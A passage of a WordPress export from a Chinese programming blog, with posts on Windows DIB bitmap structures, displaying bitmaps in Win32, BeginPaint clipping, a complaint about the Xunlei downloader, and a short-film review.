    WORD bcHeight;  // 位图高度,象素单位
    WORD bcPlanes;  // 1
    WORD bcBitCount;// 象素位数,可为 1(2 色)、4(16 色)、8(256 色)、24(真色彩)
} BITMAPCOREHEADER;
</br>
typedef struct tagRGBTRIPLE {
    BYTE    rgbtBlue;
    BYTE    rgbtGreen;
    BYTE    rgbtRed;
} RGBTRIPLE;</pre>
Windows中扩展的DIB，同样包括四部分：文件头，信息头，色彩表，位图像素位。其中文件头和OS/2中文件头一样，不同的部分结构如下：
<pre class="c">//信息头和色彩表
typedef struct tagBITMAPINFO {
    BITMAPINFOHEADER    bmiHeader;
    RGBQUAD             bmiColors[1];
} BITMAPINFO;
</br>
typedef struct tagBITMAPINFOHEADER {
    DWORD    biSize; //本结构大小字节数 40
    LONG     biWidth; //位图宽度,像素单位
    LONG     biHeight; //位图高度,像素单位
    WORD     biPlanes; // 1
    WORD     biBitCount; // 像素位数 1、4、8、16、24、32
    DWORD    biCompression; //压缩码
    DWORD    biSizeImage; //位图大小,字节
    LONG     biXPelsPerMeter;
    LONG     biYPelsPerMeter;
    DWORD    biClrUsed; //使用颜色数
    DWORD    biClrImportant; //重要的颜色数，一般为0
} BITMAPINFOHEADER;
</br>
typedef struct tagRGBQUAD {
    BYTE    rgbBlue;
    BYTE    rgbGreen;
    BYTE    rgbRed;
    BYTE    rgbReserved;
} RGBQUAD;</pre>
BITMAPINFOHEADER结构中的字段，对于biClrUsed：
<ul>
	<li>对于1位DIB，biClrUsed始终是0或者2。色彩表始终有两个条目。</li>
	<li>对于4位DIB，如果biClrUsed是0或16，则色彩表有16个条目。如果是2-15，则指的是色彩表中的条目数。每个像素最大值比该数小1。</li>
	<li>对于8位DIB。如果biClrUsed是0或256，则色彩表有256个条目。如果是2-225（系统占用了30？），则指的是色彩表中的条目数。</li>
	<li>对于16位、24位或32位DIB，biClrUsed通常为0。如果不为0，则指的是色彩表中的条目数。运行于256色视频适配器的应用程序能使用这些条目来为 DIB设置调色板</li>
</ul>
biCompression，对于4位和8位DIB，它指出了像素位是用一种行程（run-length）编码方式压缩；对于16位和32位DIB，它指出了颜色屏蔽（color masking）是否用于对像素位进行编码。
<ul>
	<li>1位DIB，biCompression始终是BI_RGB；</li>
	<li>4位DIB，biCompression可以使BI_RGB 或 BI_RLE4；</li>
	<li>8位DIB，biCompression可以是BI_RGB 或 BI_RLE8；</li>
	<li>24位DIB，biCompression始终是BI_RGB；</li>
</ul>
如果16位和32位DIB的biCompression为BI_ BITFIELDS，则紧跟BITMAPINFOHEADER后面的是3个322位颜色掩码，依次用于红色，绿色，蓝色。

位图结构到此结束了，就不介绍Windows的第4版和第5版扩展Header了。下篇将介绍位图在GDI上的显示]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>43</wp:post_id>
		<wp:post_date>2011-05-16 15:19:53</wp:post_date>
		<wp:post_date_gmt>2011-05-16 07:19:53</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e4%bd%8d%e5%9b%be%e7%bb%93%e6%9e%84</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1308573668]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[14]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>ShowDib</title>
		<link>http://codemylife.blogcn.com/2011/05/%e4%bd%8d%e5%9b%be%e6%98%be%e7%a4%ba/showdib/</link>
		<pubDate>Mon, 16 May 2011 09:10:51 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp02/M00/00/B1/wKgKCk3Q6hsAAAAAAAHWdAmAbvY987.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>46</wp:post_id>
		<wp:post_date>2011-05-16 17:10:51</wp:post_date>
		<wp:post_date_gmt>2011-05-16 09:10:51</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>showdib</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>45</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp02/M00/00/B1/wKgKCk3Q6hsAAAAAAAHWdAmAbvY987.png</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"719";s:6:"height";s:3:"477";s:14:"hwstring_small";s:23:"height='84' width='128'";s:5:"sizes";a:3:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp03/M00/00/46/wKgKC03Q6hwAAAAAAAAaXxzot_c829.png";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"124";s:3:"url";s:73:"http://files.blogcn.com/wp06/M00/00/B2/wKgKDE3Q6hwAAAAAAABYpmwC1K0206.png";}s:5:"large";a:3:{s:5:"width";s:3:"494";s:6:"height";s:3:"327";s:3:"url";s:73:"http://files.blogcn.com/wp04/M00/00/7B/wKgKDE3Q6hwAAAAAAAIO50SnJok408.png";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp05/M00/00/7B/wKgKDU3Q6hwAAAAAAAHWdCNACgE514.png";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>位图显示</title>
		<link>http://codemylife.blogcn.com/2011/05/%e4%bd%8d%e5%9b%be%e6%98%be%e7%a4%ba/</link>
		<pubDate>Mon, 16 May 2011 09:12:35 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[Windows]]></category>

		<category domain="category" nicename="windows"><![CDATA[Windows]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=45</guid>
		<description></description>
		<content:encoded><![CDATA[上篇介绍了位图的结构，这次让我们用win32程序显示位图。对于窗口程序而言，你还得提供个用用户选择bmp文件的对话框，好在Windows提供了对话框模板，不过这个结构参数也多得让人郁闷！
<pre class="c">typedef struct tagOFN {
  DWORD         lStructSize;
  HWND          hwndOwner;
  HINSTANCE     hInstance;
  LPCTSTR       lpstrFilter;
  LPTSTR        lpstrCustomFilter;
  DWORD         nMaxCustFilter;
  DWORD         nFilterIndex;
  LPTSTR        lpstrFile;
  DWORD         nMaxFile;
  LPTSTR        lpstrFileTitle;
  DWORD         nMaxFileTitle;
  LPCTSTR       lpstrInitialDir;
  LPCTSTR       lpstrTitle;
  DWORD         Flags;
  WORD          nFileOffset;
  WORD          nFileExtension;
  LPCTSTR       lpstrDefExt;
  LPARAM        lCustData;
  LPOFNHOOKPROC lpfnHook;
  LPCTSTR       lpTemplateName;
#if (_WIN32_WINNT &gt;= 0x0500)
  void *        pvReserved;
  DWORD         dwReserved;
  DWORD         FlagsEx;
#endif // (_WIN32_WINNT &gt;= 0x0500)
} OPENFILENAME, *LPOPENFILENAME;</pre>
使用BOOL GetOpenFileName(LPOPENFILENAME lpofn);函数来创建一个文件打开对话框。虽然OPENFILENAME结构字段很多，但大部分我们都不需要使用，直接置0就行了，典型的代码如下：
<pre class="c">char szFilter[] = "Bitmap Files(*.BMP)\0*.bmp\0" \
		"All Files(*.*)\0*.*\0\0";
char szFileName[MAX_PATH], szTitleName[MAX_PATH];
OPENFILENAME ofn;
</br>
memset(&amp;ofn, 0, sizeof(ofn));
ofn.lStructSize = sizeof(OPENFILENAME);
ofn.hwndOwner = hwnd;
ofn.lpstrFilter = szFilter;
ofn.lpstrFile = szFileName;
ofn.nMaxFile = MAX_PATH;
ofn.lpstrFileTitle = szTitleName;
ofn.nMaxFileTitle = MAX_PATH;
ofn.lpstrTitle = NULL;
ofn.lpstrDefExt = "bmp";</pre>
保存文件对话框函数BOOL GetSaveFileName(LPOPENFILENAME lpofn);同样使用OPENFILENAME结构。

简要讲述一下步骤，建立win32应用程序，然后添加菜单资源，文件-&gt;打开。假设打开菜单项ID为IDM_FILE_OPEN，在WndProc函数中添加WM_COMMAND消息响应：
<pre class="c">//使用如上填充ofn结构
if (! GetOpenFileName(&amp;ofn))
    return 0;
</br>
bool load = dib.LoadDibImage(szFileName);
if (load == false) {
    dib.CloseDib();
    return 0;
}
</br>
pbmi = dib.GetBitmapInfo();
pBits = dib.GetBitmapBits();
</br>
InvalidateRect(hwnd, NULL, TRUE);
</br>
if (pbmi-&gt;bmiHeader.biSize == sizeof(BITMAPCOREHEADER)) {
    cxDib = ((BITMAPCOREHEADER*)pbmi)-&gt;bcWidth;
    cyDib = ((BITMAPCOREHEADER*)pbmi)-&gt;bcHeight;
}
else {
    cxDib = pbmi-&gt;bmiHeader.biWidth;
    cyDib = abs(pbmi-&gt;bmiHeader.biHeight);
}</pre>
dib是类CDibFileInfo的对象，封装了加载位图的操作。pbmi 是指向BITMAPINFO结构的指针。pBits是BYTE类型指针，指向位图像素区。在WM_PAINT进行如下显示：
<pre class="c">hdc = BeginPaint(hwnd, &amp;ps);
</br>
if (pBits &amp;&amp; pbmi) {
    SetDIBitsToDevice(hdc, 0, 0, cxDib, cyDib, 0, 0, 0,
        cyDib, pBits, pbmi, DIB_RGB_COLORS);
}
</br>
EndPaint(hwnd, &amp;ps);</pre>
下面是LoadDibImage函数
<pre class="c">bool CDibFileInfo::LoadDibImage(const char* pstrFileName)
{
    assert(pstrFileName != NULL);
	//打开文件
    CWinFile::AccessStatus status = m_File.Open(pstrFileName,
        CWinFile::eRead, CWinFile::eSequential);
    if (status != CWinFile::eOK) {
	m_File.Close();
	return false;
    }
	//分配Buffer
    DWORD size = m_File.GetSize();
    m_pbmfh = (BITMAPFILEHEADER*)malloc(size);
    if (m_pbmfh == NULL) {
	m_File.Close();
	return false;
    }
	//读文件到Buffer
    DWORD bytesRead = 0;
    status = m_File.Read((void*)m_pbmfh, size, &amp;bytesRead);
    if (status != CWinFile::eOK) {
	m_File.Close();
	free(m_pbmfh);
	return false;
    }
</br>
    if (m_pbmfh-&gt;bfType != 0x4D42 || m_pbmfh-&gt;bfSize != size) {
	free(m_pbmfh);
	return false;
    }
        //或者 m_pbmi = (BITMAPINFO*)((BYTE*)m_pbmfh +
        //sizeof(BITMAPFILEHEADER));
    m_pbmi = (BITMAPINFO*)(m_pbmfh + 1);
    m_pBits = (BYTE*)m_pbmfh + m_pbmfh-&gt;bfOffBits;
    return true;
}</pre>
这里的CWinFile是对Windows文件操作的封装，当然你可以直接使用CreateFile或者C文件操作函数，都可以的。
截图：<img style="vertical-align: text-top;" src="http://files.blogcn.com/wp02/M00/00/B1/wKgKCk3Q6hsAAAAAAAHWdAmAbvY987.png" alt="" width="719" height="477" />]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>45</wp:post_id>
		<wp:post_date>2011-05-16 17:12:35</wp:post_date>
		<wp:post_date_gmt>2011-05-16 09:12:35</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e4%bd%8d%e5%9b%be%e6%98%be%e7%a4%ba</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1305537297]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[10]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>迅雷，做离线的娃伤不起啊</title>
		<link>http://codemylife.blogcn.com/2011/05/%e8%bf%85%e9%9b%b7%ef%bc%8c%e5%81%9a%e7%a6%bb%e7%ba%bf%e7%9a%84%e5%a8%83%e4%bc%a4%e4%b8%8d%e8%b5%b7%e5%95%8a/</link>
		<pubDate>Mon, 23 May 2011 14:57:29 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[随笔]]></category>

		<category domain="category" nicename="%e9%9a%8f%e7%ac%94"><![CDATA[随笔]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=52</guid>
		<description></description>
		<content:encoded><![CDATA[迅雷，你敢再垃圾些吗？我用迅雷7下载ubuntu种子文件，居然速度为0。下载了QQ旋风试了下，速度满速！实在气愤不过了！我受够了这样的日子（之前经常这样，还以为是源不好），于是果断把迅雷卸载了！我用了将近4年的迅雷，如今却越来越垃圾了！尤其是装了迅雷7！下载速度那叫一个慢，就没有让人舒服的爽心的下过东西，除了我用网友提供的vip号进行离线下载外！

我想说你们是需要赚钱，需要开会员，搞离线来增加自己的收入！可是至于到这种地步么？让我现在觉得下载东西，只要用迅雷下载，那速度要么慢，要么就干脆为0。相比以前广告多，可是下载速度快的迅雷5，我宁可选择它！迅雷7你界面再做的华丽，做的好看有什么用，如果下载做不好的话！

恩，不对，你们的下载技术应该很不错，要不然怎么我一上vip号下载速度就立马飙升！或许你们就是为了照顾会员而已，但如果这样的话，真的有损广大免费的网友对你们的信任！vip会员交钱是应该享受好的待遇，可你也不能去拿下载速度如此来做文章！这就好比，如果QQ会员才能聊天，才能语音，才能视频，那还能是QQ吗？这样做，终会失了网民的心。

迅雷，做离线的娃伤不起啊，有木有有木有！！！
迅雷，做会员的娃伤不起啊，有木有有木有！！！]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>52</wp:post_id>
		<wp:post_date>2011-05-23 22:57:29</wp:post_date>
		<wp:post_date_gmt>2011-05-23 14:57:29</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e8%bf%85%e9%9b%b7%ef%bc%8c%e5%81%9a%e7%a6%bb%e7%ba%bf%e7%9a%84%e5%a8%83%e4%bc%a4%e4%b8%8d%e8%b5%b7%e5%95%8a</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1306162711]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>keywords</wp:meta_key>
		<wp:meta_value><![CDATA[迅雷 垃圾 离线 伤不起]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>title</wp:meta_key>
		<wp:meta_value><![CDATA[迅雷，做离线的娃伤不起啊]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[8]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>关于WM_PANT消息的处理</title>
		<link>http://codemylife.blogcn.com/2011/06/%e5%85%b3%e4%ba%8ewm_pant%e6%b6%88%e6%81%af%e7%9a%84%e5%a4%84%e7%90%86/</link>
		<pubDate>Mon, 20 Jun 2011 13:11:43 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[Windows]]></category>

		<category domain="category" nicename="windows"><![CDATA[Windows]]></category>

		<category domain="tag"><![CDATA[Windows]]></category>

		<category domain="tag" nicename="windows"><![CDATA[Windows]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=53</guid>
		<description></description>
		<content:encoded><![CDATA[昨天练习DX的时候碰到了一个问题，问题本身和DX没关系，相关代码如下：
Windows窗口类：
<pre class="c">wc.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);</pre>
对WM_PAINT消息的处理：
<pre class="c">RECT rect;
</br>
HDC hdc = BeginPaint(hwnd, &amp;ps);
GetClientRect(hwnd, &amp;rect);
</br>
static bool flag = true;
if (flag) {
    hBrush = CreateSolidBrush(RGB(0,255,0));
    flag = false;
}
else {
    hBrush = CreateSolidBrush(RGB(255,0,0));
    flag = true;
}
FillRect(hdc, &amp;rect, hBrush);
DeleteObject(hBrush);
EndPaint(hwnd, &amp;ps);</pre>
其实就是红绿翻转，这里我遇到的问题是，假设本窗口A当前是绿色，当A被另一个窗口B（无论什么窗口）部分遮住的时候，移开窗口B，A之前的被遮区域显示出红色，也即只是部分被绘制，可是我不是用的FillRect填充了整个客户区么？

之后被simoreg兄指出来："当你使用BeginPaint，得到的DC只是需要重绘的DC，超出区域，就被裁剪"。遂赶紧查了下BeginPaint，果然是这个样子。msdn上说明如下：

The BeginPaint function automatically sets the clipping region of the device context to <span style="color: #ff0000;">exclude any area outside the update region</span>.

The update region is set by the InvalidateRect or InvalidateRgn function and by the system after sizing, moving, creating, scrolling, or any other operation that affects the client area.

这样就解释通了，并且使用GetDC得到的句柄来调用FillRect，就对了。观察了下和BeginPaint获取的句柄地址确实不一样！我觉得可以这样理解<strong>（纯属猜想）</strong>，hdc被称为设备描述表的句柄，里面的数据结构包含如下结构:
<pre class="c">struct HDC {
LPVOID device;
RECT rect;
……
};</pre>
那么BeginPaint 和 GetDC，或者 GetWindowDC 是 struct HDC的对象，对象里面的device应该是一样的，均指向图形设备驱动，只是所需要绘制的区域rect可能不同而已！

我上面遇到的问题是，我用BeginPaint获取的hdc，因为忽视了其内部的rect，导致用FillRect画的矩形被裁剪掉了。

另，查了下msdn，发现可以使用如下函数来获取无效矩形，也即“脏矩形”：
<pre class="c">BOOL GetUpdateRect(
  HWND hWnd,       // handle to window
  LPRECT lpRect,   // update rectangle coordinates
  BOOL bErase      // erase state
);</pre>
msdn上说的很有意思：

The update rectangle retrieved by the BeginPaint function is<span style="color: #ff0000;"> identical</span> to that retrieved by GetUpdateRect.

BeginPaint automatically validates the update region, so any call to GetUpdateRect made immediately after the call to BeginPaint retrieves an empty update region.

我进行了如下验证：
<pre class="c">RECT rect;
GetUpdateRect(hwnd, &amp;rect, TRUE);
HDC hdc = BeginPaint(hwnd, &amp;ps);
……</pre>
发现确实如此，获得的这块区域，就是重绘的区域！
ps:GetUpdateRect要在BeginPaint之前调用，不然会置0。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>53</wp:post_id>
		<wp:post_date>2011-06-20 21:11:43</wp:post_date>
		<wp:post_date_gmt>2011-06-20 13:11:43</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e5%85%b3%e4%ba%8ewm_pant%e6%b6%88%e6%81%af%e7%9a%84%e5%a4%84%e7%90%86</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343359161]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[9]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>十一度青春</title>
		<link>http://codemylife.blogcn.com/2011/07/%e5%8d%81%e4%b8%80%e5%ba%a6%e9%9d%92%e6%98%a5/</link>
		<pubDate>Sun, 03 Jul 2011 16:16:00 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[随笔]]></category>

		<category domain="category" nicename="%e9%9a%8f%e7%ac%94"><![CDATA[随笔]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=56</guid>
		<description></description>
		<content:encoded><![CDATA[最近似乎有点怀旧，起因源于上班时听《老男孩》，于是乎把十一度青春翻出来，再看一遍。

《李雷和韩梅梅》，单从名字上勾起了我们对初中英语课本的回忆，剧情却丝毫没什么联系。一个平凡的故事，无须多言，正如字幕说的那样：“请相信在这个城市，平凡的你总能主演出一部热气腾腾的温情戏”。

《L.I》，有点科幻片的味道。爱情保险，正如字幕：“对于年轻的我们来说，也许最需要的，是一份没有保质期的爱情”。爱与不爱，有时候是不由自主的。

《阿泽的夏天》，讲述了一个农村的孩子到城里打工的故事，在城里经历一段时间后，和城里的大伟一起回农村创业的故事！大伟的经历印证了：“生命没有投机，平凡也能创造奇迹”。值得一提的是里面一个路人甲因为看到了金鱼的商机，后来出来做金鱼生意，还做得不错。

《江湖再见》，这是一部比较触动我的短片。故事的开端男孩和女孩的争执开端，因为女孩的家里觉得男孩没钱，家里给女孩介绍了男朋友，男孩转身离开。
女孩问：“你更本就不爱我”
男孩说：“你想我怎么证明我爱你？”
画面定格几秒，女孩说：“你要不要和我一起死啊，就像这水里的鱼，没有现实的压力，只要有水就好啦！”。
中间省略n个字，遇见了开车的男的和手捧金鱼的女的，一起去将金鱼放生。相濡以沫，不如相忘于江湖！在女的将金鱼放下水中的时候，画面出现了男孩和女孩在水底亲吻，然后分开。
女人：“以前因为现实，这样那样，和我最喜欢的男人分开。可是没想到，离婚以后，我最怀念的最忘不掉的竟然是那个人。这两条鱼，也许是我拿它当做我和他了吧。”
男人：“其实最早的时候，我也是因为现实的各种压力才和我最喜欢的女孩分开的，但她至少教会了我努力”
女孩：“以后我们还会再遇见吗？在另一条河里”
男孩：“只要你还活着，我还活着”
女孩：“那婚礼要叫你来吗”
男孩：“我怕我那天没空”
女孩：“你都不知道是哪天”
男孩：“以后每一天都不会有空的”
男人：“其实我们当时没有办法在一起，不是因为现实的压力，而是因为我们还不够好，还不够好到有资格去拥有那份幸福”
女孩：“忘了我”
男孩：“好，忘了你”
穿梭的人群，男孩女孩彼此擦肩而过。而男人女人一见如故，觉得上辈子是两条金鱼。
字幕：“这次的分别是为了下次的相遇，说好的幸福其实一直都在”。

节选一些豆瓣上网友关于《江湖再见》的影评：
琏城：“至少我教会了他努力，至少他教会了我爱。 我会一直做好，在我的这条河里，我也相信他会努力，在他的河里。也许爱的最好的证明就是他忘了我，我也忘了他。然后我们重新做好自己。 等待着重遇的那一天 ”
JaneYao：“可是，在深夜的时候，总是会想起那个相忘于江湖的人吧。 想知道TA过得好不好，幸不幸福，快不快乐…… 谢谢，快乐，再见，再也不见”
moniwon：“两人不能在一起只能说明彼此不够相爱。 所有的理由，其实真不叫理由 ”
Demo❤兽兽 ：“忘了你是为了更好的遇见。忘了你不是因为不够爱，是要让彼此更好的走下去 ”

《泡芙小姐的金鱼缸》，讲述了一个关于爱情的占有和自由的故事。泡芙小姐已经成了优酷的一个作品系列了，在不断推出，所以这里不多谈了。字幕：“其实，这个城市许多人都和泡芙一样，在占有和自由之间，寻找着真爱，泡芙小姐的金鱼缸，是等待爱情的空白”。

《东奔西游》，整个十一度青春里面最美创意的一部短片。字幕：“神仙也在奋斗的路上了，你呢？”。

《朝花夕拾》，讲述了男主角在碰到头疼问题时，遇见57岁未来的自己。字幕：“当青春遇见57岁得自己，让我明白，人生没有什么过不去的坎！”。

《拳击手的秘密》，或许太喧嚣了，闭上眼睛，心灵宁静一些。

太晚了，《哎》和《老男孩》明晚继续写，哦，是今晚。



]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>56</wp:post_id>
		<wp:post_date>2011-07-04 00:16:00</wp:post_date>
		<wp:post_date_gmt>2011-07-03 16:16:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e5%8d%81%e4%b8%80%e5%ba%a6%e9%9d%92%e6%98%a5</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
